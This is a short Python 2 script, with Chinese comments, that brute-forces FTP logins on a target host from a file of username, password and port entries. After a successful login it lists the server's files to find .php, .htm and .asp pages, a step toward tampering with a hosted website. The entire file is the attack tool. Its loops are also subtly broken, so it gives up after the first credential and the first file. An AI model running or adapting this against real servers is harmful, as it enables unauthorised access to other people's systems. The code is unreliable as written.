#!/usr/bin/env python
# -*- coding: UTF-8 -*-
"""
$ FtpServer_anonymous_creak.py -H 192.168.150.137 -P ftp_passwd

ftp_passwd内容:
anonymous:anonymousa:2121
"""

import ftplib
import optparse


def brute_login(hostname, password_file):
    """读取password文件测试"""
    try:
        with open(password_file, 'r') as f:
            for line in f.readlines():
                username = line.split(':')[0]
                password = line.split(':')[1].strip('\r').strip('\n')
                port = line.split(':')[2].strip('\r').strip('\n')
                print "[+] Trying: " + username + ":" + password
                res, ftp = ftp_connect(hostname, port, username, password)
                if res:
                    print '\n[+] ' + str(hostname) + ': FTP Logon Succeeded: ' + username + ":" + password
                    returnDefault(ftp)
                    ftp.quit()
                    return None, None
                print '\n[-] Could not brute force FTP credentials.'
                return None, None
    except Exception as e:
        print(e)


def ftp_connect(hostname, port, username, password):
    """ftp连接测试"""
    try:
        ftp = ftplib.FTP()
        ftp.connect(hostname, port)
        ftp.login(username, password)
        return True, ftp
    except Exception:
        return False, None


def main():
    parse = optparse.OptionParser("usage %prog -H <target host> -P <target password>")
    parse.add_option('-H', dest='tgt_host', type='string', help='specify target host')
    parse.add_option('-P', dest='tgt_password_file', type='string', help='specify target password')
    (options, args) = parse.parse_args()
    if (options.tgt_host is None) | (options.tgt_password_file is None):
        print parse.usage
    else:
        host = options.tgt_host
        password_file = options.tgt_password_file
        brute_login(host, password_file)


def returnDefault(ftp):
    """扫描 FTP服务器上是否有web服务的网页，扫描ftp文件中是否有默认的php,asp,html默认的网页"""
    try:
        dir_list = ftp.nlst()
    except Exception:
        print '[-] Could not list directory contents.'
        print '[-] Skipping To Next Target.'
        return
    retList = []
    for filename in dir_list:
        fn = filename.lower()
        if '.php' in fn or '.htm' in fn or '.asp' in fn:
            print '[+] Found default page: ' + filename
            retList.append(filename)
        else:
            print '[-] Sorry it`s not have web defaulte page'
        return retList


if __name__ == '__main__':
    main()
